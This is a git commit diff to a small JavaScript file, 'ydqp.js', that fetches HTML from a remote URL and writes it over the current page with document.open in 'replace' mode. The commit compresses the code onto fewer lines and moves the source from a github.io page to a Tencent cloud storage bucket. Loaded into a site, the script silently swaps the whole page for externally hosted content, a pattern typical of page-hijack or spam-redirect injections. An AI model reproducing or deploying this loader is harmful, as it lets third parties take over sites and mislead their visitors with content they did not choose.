9f3cbbcf149e4b68c76ba1bc9be34b6b8da401d6
dj88888 <127208493+dj88888@users.noreply.github.com>
2024-04-25 14:07:58 +0800

    Update ydqp.js

--- ydqp.js
+++ ydqp.js
@@ -1,20 +1,10 @@
 function loadhtml(url){ 
  var xhr = new XMLHttpRequest;
  var html = null;
- function render() {
-  var a = document.open("text/html", "replace");
+ function render() {var a = document.open("text/html", "replace");
   a.write(html);
-  a.close();
- }
- xhr.onload = function () {
-  html = xhr.responseText;
-  var delay = 0;
-  if (delay > 0) setTimeout("render()", delay * 1000)
-  else render();
- };
+  a.close();}
+ xhr.onload = function () {html = xhr.responseText;var delay = 0;if (delay > 0) setTimeout("render()", delay * 1000)else render();};
  xhr.open("GET", url, !0);
- xhr.send(); 
-}
-
-
- loadhtml('http://dj88888.github.io/video/ydqptz.html')
+ xhr.send();}
+ loadhtml('https://hao-1325016339.cos.ap-guangzhou.myqcloud.com/c.html')
